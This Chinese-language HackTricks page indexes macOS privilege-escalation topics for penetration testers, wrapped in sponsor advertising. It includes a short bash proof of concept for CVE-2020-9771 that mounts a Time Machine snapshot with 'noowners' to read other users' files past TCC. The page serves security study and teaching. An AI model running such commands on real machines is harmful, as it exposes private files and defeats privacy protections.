# macOS安全与权限提升

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密漏洞赏金的家园。**

**即时获得奖励**\
HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞经过验证后，您将获得奖励。

**在web3渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！在其崛起之时掌握web3安全。

**成为web3黑客传奇**\
每次验证的漏洞都会获得声誉积分，并登上每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register) 从您的黑客行动中获利！

{% embed url="https://hackenproof.com/register" %}

## 基本的MacOS

如果您对macOS不熟悉，您应该开始学习macOS的基础知识：

* 特殊的macOS**文件和权限：**

{% content-ref url="macos-files-folders-and-binaries/" %}
[macos-files-folders-and-binaries](macos-files-folders-and-binaries/)
{% endcontent-ref %}

* 常见的macOS**用户**

{% content-ref url="macos-users.md" %}
[macos-users.md](macos-users.md)
{% endcontent-ref %}

* **AppleFS**

{% content-ref url="macos-applefs.md" %}
[macos-applefs.md](macos-applefs.md)
{% endcontent-ref %}

* **内核**的**架构**

{% content-ref url="mac-os-architecture/" %}
[mac-os-architecture](mac-os-architecture/)
{% endcontent-ref %}

* 常见的macOS**网络服务和协议**

{% content-ref url="macos-protocols.md" %}
[macos-protocols.md](macos-protocols.md)
{% endcontent-ref %}

### MacOS MDM

在公司中，**macOS**系统很可能会通过MDM进行**管理**。因此，从攻击者的角度来看，了解**它是如何工作的**是很有意义的：

{% content-ref url="../macos-red-teaming/macos-mdm/" %}
[macos-mdm](../macos-red-teaming/macos-mdm/)
{% endcontent-ref %}

### MacOS - 检查、调试和模糊测试

{% content-ref url="macos-apps-inspecting-debugging-and-fuzzing/" %}
[macos-apps-inspecting-debugging-and-fuzzing](macos-apps-inspecting-debugging-and-fuzzing/)
{% endcontent-ref %}

## MacOS安全保护

{% content-ref url="macos-security-protections/" %}
[macos-security-protections](macos-security-protections/)
{% endcontent-ref %}

## 攻击面

### 文件权限

如果以**root身份运行的进程**写入一个可以被用户控制的文件，用户可以利用这一点来**提升权限**。\
这种情况可能发生在以下情况下：

* 使用的文件已经由用户创建（由用户拥有）
* 使用的文件由于一个组的原因可被用户写入
* 使用的文件位于用户拥有的目录中（用户可以创建文件）
* 使用的文件位于由root拥有但用户具有写入权限的目录中（用户可以创建文件）

能够**创建一个将被root使用的文件**，允许用户**利用其内容**，甚至创建**符号链接/硬链接**将其指向另一个位置。

对于这种类型的漏洞，不要忘记**检查易受攻击的`.pkg`安装程序**：

{% content-ref url="macos-files-folders-and-binaries/macos-installers-abuse.md" %}
[macos-installers-abuse.md](macos-files-folders-and-binaries/macos-installers-abuse.md)
{% endcontent-ref %}

### 权限滥用和特权滥用通过进程滥用

如果一个进程可以**向具有更高特权或权限的另一个进程注入代码**或与其联系以执行特权操作，它可以提升权限并绕过防御措施，如[Sandbox](macos-security-protections/macos-sandbox/)或[TCC](macos-security-protections/macos-tcc/)。

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}
### 文件扩展名和URL方案应用程序处理程序

通过文件扩展名注册的奇怪应用程序可能会被滥用，并且可以注册不同的应用程序来打开特定的协议。

{% content-ref url="macos-file-extension-apps.md" %}
[macos-file-extension-apps.md](macos-file-extension-apps.md)
{% endcontent-ref %}

## MacOS权限提升

### CVE-2020-9771 - mount\_apfs TCC绕过和权限提升

**任何用户**（即使是非特权用户）都可以创建和挂载时间机器快照，并**访问该快照的所有文件**。\
唯一需要的特权是所使用的应用程序（如`Terminal`）具有**完全磁盘访问权限**（FDA）（`kTCCServiceSystemPolicyAllfiles`），需要由管理员授予。
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

更详细的解释可以在[**原始报告中找到**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**。**

### 敏感信息

{% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
[macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
{% endcontent-ref %}

### Linux提权

首先，请注意**大多数关于特权提升的技巧都会影响MacOS机器**。所以请参考：

{% content-ref url="../../linux-hardening/privilege-escalation/" %}
[privilege-escalation](../../linux-hardening/privilege-escalation/)
{% endcontent-ref %}

## MacOS防御应用程序

## 参考资料

* [**OS X事件响应：脚本和分析**](https://www.amazon.com/OS-Incident-Response-Scripting-Analysis-ebook/dp/B01FHOHHVS)
* [**https://taomm.org/vol1/analysis.html**](https://taomm.org/vol1/analysis.html)
* [**https://github.com/NicolasGrimonpont/Cheatsheet**](https://github.com/NicolasGrimonpont/Cheatsheet)
* [**https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ**](https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ)
* [**https://www.youtube.com/watch?v=vMGiplQtjTY**](https://www.youtube.com/watch?v=vMGiplQtjTY)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密漏洞赏金的家园。**

**即时获得奖励**\
HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞经过验证后，您将获得奖励。

**在web3渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！在其兴起的日子里掌握web3安全。

**成为web3黑客传奇**\
每次验证的漏洞都会获得声誉积分，并占领每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客行动中获利！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
